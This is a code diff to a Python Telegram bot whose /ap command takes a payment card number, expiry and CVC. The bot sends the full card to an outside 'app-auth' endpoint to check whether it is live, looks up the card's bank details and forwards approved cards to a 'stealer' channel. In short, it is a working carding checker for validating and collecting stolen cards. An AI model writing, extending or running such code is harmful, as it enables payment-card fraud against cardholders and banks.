@@ -18,7 +18,7 @@ async def send_hit_if_approved(client: Client, text: str):
         print(f"[Stealer Error] Failed to forward: {e}")
 
 @Client.on_message(filters.command("ap", [".", "/"]))
-async def ap_cmd(Client, message):
+async def app_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
@@ -33,7 +33,7 @@ async def ap_cmd(Client, message):
         getcc = await getmessage(message)
         
         if getcc == False:
-            resp = f"""〈<a href='tg://user?id={user_id}'>{first_name}</a>〉-» App Based Auth - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway} \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /ap cc|month|year|cvc"""
+            resp = f"〈<a href='tg://user?id={user_id}'>{first_name}</a>〉-» App Based Auth - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway} \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /ap cc|month|year|cvc"
             await message.reply_text(resp, quote=True)
             return
 
@@ -41,10 +41,10 @@ async def ap_cmd(Client, message):
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
         endpoint_url = f"https://onyxenvbot.up.railway.app/app-auth/key=yashikaaa/cc={fullcc}"
 
-        firstresp = f"""\n↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n</b>\n"""
+        firstresp = f"\n↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n</b>\n"
         msg = await message.reply_text(firstresp, quote=True)
 
-        secondresp = f"""\n↯ Checking..\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□\n"""
+        secondresp = f"\n↯ Checking..\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□\n"
         await asyncio.sleep(0.5)
         await msg.edit_text(secondresp)
 
@@ -54,8 +54,16 @@ async def ap_cmd(Client, message):
         try:
             response_obj = await session.get(endpoint_url)
             result_json = response_obj.json()
-            status = result_json.get("status", "Unknown")
+            api_status = result_json.get("status", "Unknown").lower()
             response = result_json.get("response", "No response message")
+            
+            if "approved" in api_status:
+                status = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
+            elif "declined" in api_status or "failed" in api_status:
+                status = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ✖️"
+            else:
+                status = api_status.upper()
+                
         except httpx.RequestError as e:
             status = "Error"
             response = f"Request failed: {e}"
@@ -65,7 +73,7 @@ async def ap_cmd(Client, message):
 
         getbin = await get_bin_details(cc)
 
-        thirdresp = f"""\n↯ Checking...\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■\n"""
+        thirdresp = f"\n↯ Checking...\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■\n"
         await asyncio.sleep(0.5)
         await msg.edit_text(thirdresp)
 
@@ -74,7 +82,7 @@ async def ap_cmd(Client, message):
         end = time.perf_counter()
         elapsed_time = round(end - start, 2)
 
-        finalresp = f"""\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\n\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href='tg://user?id={user_id}'>{first_name}</a> [{role}] \n\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\n"""
+        finalresp = f"\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\n\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href='tg://user?id={user_id}'>{first_name}</a> [{role}] \n\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\n"
 
         await asyncio.sleep(0.5)
         await msg.edit_text(finalresp)
@@ -82,7 +90,7 @@ async def ap_cmd(Client, message):
         await setantispamtime(user_id)
         await deductcredit(user_id)
 
-        if status == "Approved ✅":
+        if "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status or "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
             await sendcc(finalresp, session)
 
         await session.aclose()
